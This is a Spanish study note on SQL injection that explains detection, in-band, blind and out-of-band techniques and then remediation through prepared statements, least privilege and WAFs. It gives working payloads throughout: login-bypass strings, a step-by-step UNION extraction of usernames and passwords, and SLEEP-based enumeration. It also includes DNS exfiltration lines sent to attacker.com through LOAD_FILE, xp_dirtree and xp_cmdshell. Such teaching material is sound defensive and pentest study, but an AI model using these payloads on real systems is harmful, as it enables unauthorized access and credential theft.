# SQL Injection — Fundamentos, Detección y Explotación (In-Band, Blind, Out-of-Band)

Relacionado: [[Bases-de-Datos-SQL]] · [[Herramientas-SQLMap]] · [[OWASP-Top-10-2025]] · [[Herramientas-Burp-Suite-Repeater]] · [[Herramientas-Burp-Suite-Intruder]] · [[SQL-Injection-Practica-4-Niveles-Ejemplo]]

## Qué es y por qué importa
SQL Injection ocurre cuando una app incorpora input del usuario directo en una query SQL sin sanitizar/parametrizar — el input se trata como código SQL, no como dato, permitiendo alterar la lógica de la consulta. Categoría OWASP: Injection (ver [[OWASP-Top-10-2025]]). Consecuencias: acceso no autorizado a datos, bypass de autenticación, modificación/borrado de registros, y en casos extremos control total del servidor de BD.

## 1. Piezas SQL que hacen posible la inyección

### Comentarios
`--` (doble guion + espacio) o `#` para comentario de una línea en MySQL; `/* */` para multilínea. Clave para inyección: cortar limpio el resto de la query original que sobra después del payload.
```sql
-- Original: SELECT * FROM users WHERE username='INPUT' AND password='secret';
-- Inyectando  admin'--  como username:
SELECT * FROM users WHERE username='admin'-- AND password='secret';
```
Todo después de `--` se ignora — el chequeo de password nunca corre.

### UNION
Combina resultados de 2+ `SELECT` en un solo resultset — **regla crítica**: ambas queries deben devolver el mismo número de columnas, con tipos compatibles.
```sql
SELECT name, age FROM students UNION SELECT username, id FROM admins;
```
Base de **Union-Based SQLi**: agregar un `SELECT` propio a una query legítima para jalar datos de tablas completamente distintas.

### LIKE y wildcards
`%` matchea cualquier secuencia de caracteres, `_` matchea exactamente uno.
```sql
SELECT * FROM users WHERE username LIKE 'adm%';
```
En Blind SQLi, `LIKE` con wildcards permite enumerar datos **carácter por carácter** (`LIKE 'a%'`, `LIKE 'b%'`, etc.).

### LIMIT
`LIMIT offset, count` — controla cuántas filas y desde dónde.
```sql
SELECT * FROM users LIMIT 1;       -- solo la primera fila
SELECT * FROM users LIMIT 2, 1;    -- salta 2 filas, devuelve la 3ra
```

### Funciones de string clave
- `group_concat(col SEPARATOR 'x')`: junta valores de varias filas en un solo string — `SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;` → `admin:pass123<br>martin:secret<br>...`
- `CONCAT(a, b)`: junta valores individuales de una sola fila.

### `information_schema` — el mapa de la base de datos
Base de datos integrada en MySQL/MariaDB/PostgreSQL con metadatos de todo lo demás:
- `information_schema.tables`: lista todas las tablas (`table_schema` = nombre de BD, `table_name` = nombre de tabla).
- `information_schema.columns`: lista todas las columnas (`table_name`, `column_name`).

Es la forma de pasar de "puedo inyectar" a "conozco cada tabla y columna de esta base de datos".

> Este tipo de referencia usa sintaxis MySQL. MSSQL/PostgreSQL/SQLite/Oracle tienen su propia sintaxis de comentarios, tablas de sistema y funciones — los conceptos centrales se transfieren, los payloads exactos cambian.

## 2. Dónde vive la vulnerabilidad
Si el backend concatena el input directo en el string SQL:
```php
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";
```
Un `?id=1 OR 1=1--` convierte la query en:
```sql
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
```
`OR 1=1` vuelve el `WHERE` siempre verdadero, `--` comenta el chequeo de `public = 1` — la BD devuelve todo, incluido contenido privado.

## 3. Las 3 categorías de SQLi
| Categoría | Cómo se entera el atacante | Subtipos |
|---|---|---|
| **In-Band** | resultado visible directo en la respuesta — la más fácil | Error-Based, Union-Based |
| **Blind** | no hay resultado/error visible — hay que inferir por comportamiento | Authentication Bypass, Boolean-Based, Time-Based |
| **Out-of-Band** | ni siquiera hay señal indirecta — se fuerza al servidor de BD a hacer una conexión saliente (DNS/HTTP) hacia un host propio | — |

## 4. Detectar SQLi
Probar en cualquier input que interactúe con la BD: parámetros de URL, campos de formulario (login, búsqueda, comentarios), cookies, headers HTTP.
- `'` (comilla simple): la prueba más común — si aparece un error de BD, el input probablemente se inserta sin manejo adecuado.
- `"` (comilla doble): algunas queries usan comillas dobles en vez de simples.
- `;--`: si el comportamiento cambia, la sintaxis de comentario se está procesando.
- `OR 1=1`: si cambian los resultados, el input está directo en la lógica de la query.

Si la app suprime errores, hay que recurrir a diferencias de comportamiento (Boolean-Based) o retrasos de tiempo (Time-Based).

## 5. In-Band SQLi

### Error-Based
Explota mensajes de error de la BD mostrados al usuario. Inyectar `'` puede producir algo como:
```
You have an error in your SQL syntax; ... near ''1'' at line 1
```
Revela: motor de BD (MySQL en el ejemplo), cómo está envuelto el input (comillas simples), y que la app no maneja errores con cuidado — suficiente para craftear payloads más precisos.

### Union-Based — metodología completa (6 pasos)
1. **Contar columnas** — probar incrementalmente hasta que desaparezca el error:
```sql
1 UNION SELECT 1          -- error
1 UNION SELECT 1,2        -- error
1 UNION SELECT 1,2,3      -- éxito: 3 columnas
```
2. **Identificar qué columnas se muestran** — forzar que la query original no devuelva nada (ID inválido) para que solo se vea el output del `UNION`:
```sql
0 UNION SELECT 1,2,3
```
El número que aparece en el área de contenido es la columna útil para extracción.
3. **Extraer el nombre de la BD**:
```sql
0 UNION SELECT 1,2,database()
```
4. **Enumerar tablas**:
```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'db_name'
```
5. **Enumerar columnas**:
```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
```
6. **Extraer datos**:
```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
```

Por qué cada paso funciona: el conteo de columnas debe coincidir porque así está definido `UNION`; se usa `0`/`-1` como ID para que la query original devuelva vacío y solo se renderice la inyectada; `information_schema` es el catálogo propio de la BD.

## 6. Blind SQLi

### Authentication Bypass
Query típica de login:
```sql
SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
```
La app solo revisa si devuelve fila o no (nunca muestra el resultado crudo). Inyectando `' OR 1=1;--` como username:
```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```
`username=''` no matchea nada · `OR 1=1` siempre verdadero → todo el `WHERE` se vuelve verdadero · `;--` cierra la sentencia y comenta el resto (incluido el chequeo de password) → la BD devuelve todas las filas, la app loguea como el primer usuario (a menudo admin).

Variantes: `' OR 1=1;--` (comillas simples) · `' OR 1=1#` (comentario estilo MySQL) · `" OR 1=1--` (comillas dobles) · probar tanto username como password, ya que a veces solo uno de los dos campos se concatena directo en la query. Para apuntar a un usuario específico conocido: `admin'--` comenta el chequeo de password por completo.

### Boolean-Based Blind
La app da una señal binaria (contenido distinto, un JSON `{"taken":true/false}`, etc.). Se usa esa señal para hacer preguntas sí/no a la BD.
1. **Confirmar inyección** con una condición siempre verdadera:
```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```
2. **Adivinar el nombre de la BD, carácter por carácter**:
```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--   -- false
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--   -- true, primer carácter: s
```
Se repite fijando cada carácter confirmado y probando el siguiente.
3. **Nombres de tabla/columna** con el mismo patrón contra `information_schema`.

Lento (cada carácter toma varias peticiones), pero confiable incluso cuando todos los demás canales de salida están bloqueados.

### Time-Based Blind
Para cuando la app no da absolutamente ninguna diferencia visual — mismo contenido, mismo status code, mismos headers. La única señal es **cuánto tarda la respuesta**.
```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```
`SLEEP(5)` de MySQL pausa la ejecución solo si la condición envuelta es verdadera — si el nombre de BD empieza con `s`, la respuesta tarda ~5s; si no, vuelve de inmediato.

1. **Contar columnas** con `SLEEP`:
```sql
admin123' UNION SELECT SLEEP(5);--        -- sin delay (conteo incorrecto)
admin123' UNION SELECT SLEEP(5),2;--      -- delay de 5s (2 columnas)
```
2. **Enumerar** con el mismo patrón `LIKE` carácter por carácter, pero mirando el reloj en vez del contenido: delay = verdadero, respuesta inmediata = falso.

> ⚠️ La latencia de red puede confundir la detección — usar delays largos (5-10s) y probar cada carácter un par de veces para confirmar. En MSSQL el equivalente es `WAITFOR DELAY '0:0:5'`.

**Cuándo usar cada uno:**
| Escenario | Técnica |
|---|---|
| La app muestra contenido distinto para verdadero/falso | Boolean-Based |
| La respuesta se ve idéntica sin importar qué se inyecte | Time-Based |
| Time-based bloqueado o poco confiable | Out-of-Band |

## 7. Out-of-Band SQLi
Último recurso cuando ni In-Band ni Blind funcionan. En vez de leer el resultado por el mismo canal HTTP, se fuerza a la BD a hacer una conexión saliente (DNS o HTTP) hacia un servidor propio, empacando el dato robado en esa misma conexión. **Requiere que el servidor de BD tenga acceso de salida a internet** — si el firewall lo bloquea todo, OOB no es viable.

### Exfiltración DNS con MySQL (`LOAD_FILE`)
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```
`(SELECT database())` extrae el dato deseado · `CONCAT()` arma la ruta `\\webapp_db.attacker.com\share` · `LOAD_FILE()` intenta leer esa ruta — en Windows esto dispara una resolución DNS para `webapp_db.attacker.com` · el servidor DNS propio captura la petición y registra el dato como subdominio. Funciona mejor contra MySQL corriendo en Windows (rutas UNC disparan resolución DNS).

### MSSQL
```sql
EXEC master..xp_dirtree '\\attacker.com\share';
```
Intenta listar un directorio remoto — al resolver esa ruta, Windows dispara una consulta DNS para `attacker.com` antes de intentar la conexión SMB. Sigue disponible y activo en la mayoría de instalaciones (a diferencia de `xp_cmdshell`, que viene deshabilitado por default en versiones modernas de MSSQL, por eso `xp_dirtree` es la opción "de facto" en pentests reales).
```sql
EXEC xp_cmdshell 'nslookup data.attacker.com';
```
Si `xp_cmdshell` está habilitado, ejecuta comandos de OS directamente — más potente, pero mucho menos común encontrarlo activo.

### Recibir los datos
- **Burp Collaborator**: da un subdominio único y registra cualquier DNS/HTTP request que le llegue.
- **Interactsh** (ProjectDiscovery): gratis, autohospedable, mismo concepto.
- Listener propio (servidor DNS en Python con `dnslib`, o un HTTP server básico).

### Limitaciones
El servidor de BD necesita acceso saliente (muchos entornos de producción lo restringen) · payloads específicos por motor de BD · exfiltración DNS limitada a 63 caracteres por label de subdominio · generalmente más lento y menos confiable que extraer directo.

## 8. Remediación (de más a menos efectiva)

### Prepared Statements — la solución real
Separan el código SQL del dato: la estructura de la query se define con placeholders, y el input del usuario se manda por separado, tratado siempre como dato, nunca como SQL ejecutable.
```php
// Vulnerable
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
// Corregido (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
```
```python
# Vulnerable
query = f"SELECT * FROM users WHERE username='{username}'"
# Corregido
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```
**Por qué es estructural, no solo "mejor filtrado":** con `prepare()`, la BD compila y fija el plan de ejecución de la query **antes** de que exista ningún dato del usuario en la ecuación — decide tabla, columnas, índices, toda la "forma" queda congelada. Con `execute([$valor])`, el dato viaja por un canal completamente separado (un parámetro tipado en el protocolo binario cliente-BD), no como texto que se inserta en un string SQL. Para cuando el dato llega, la BD ya terminó de interpretar sintaxis — cualquier cosa que se mande (`' OR 1=1--`, comillas, punto y coma) se trata como contenido literal, nunca como instrucción. Es imposible que el payload "se salga" del hueco y reescriba la lógica, porque el hueco ya no es una posición dentro de un string de texto. A diferencia de un WAF (puede fallar contra un payload desconocido) o el escaping (puede fallar contra un carácter que el dev no consideró), los prepared statements no dependen de anticipar todos los ataques posibles — cierran la puerta de raíz.

### Input Validation
Definir exactamente qué es válido y rechazar todo lo demás (**allowlisting**, no blocklisting):
```php
if (!ctype_digit($_GET['id'])) { die("Invalid input"); }
```
Nunca como única defensa — usar junto con prepared statements. El blocklisting (filtrar caracteres como `'` o `--`) es frágil: doble encoding, sintaxis alterna, algo no contemplado, siempre hay forma de rodearlo.

### Escaping
Anteponer `\` a caracteres especiales (`'` → `\'`) para que se traten como literales. Frágil y específico de cada motor — cada uno tiene sus propias reglas de escape. Usar solo como último recurso (ej. código legado que no se puede refactorizar a prepared statements).

### Principio de Mínimo Privilegio
Limitar el daño incluso si algo falla: la cuenta de BD que usa la app debe tener el mínimo necesario — solo `SELECT` si la app es de solo lectura, nunca conectar como `root`/`sa`, restringir acceso a tablas sensibles. Si alguien explota SQLi vía una cuenta de bajo privilegio, no puede hacer `DROP` de tablas, acceder a otras BDs, ni correr comandos de sistema.

### WAF
Inspecciona requests entrantes y bloquea patrones conocidos (`' OR 1=1`, `UNION SELECT`, `information_schema`). Capa extra, **nunca sustituto** de código seguro — atacantes experimentados los saltan con encoding, sintaxis alterna y ofuscación.

## 9. Práctica guiada — 4 niveles
Desarrollo completo, payloads y credenciales extraídas en [[SQL-Injection-Practica-4-Niveles-Ejemplo]].
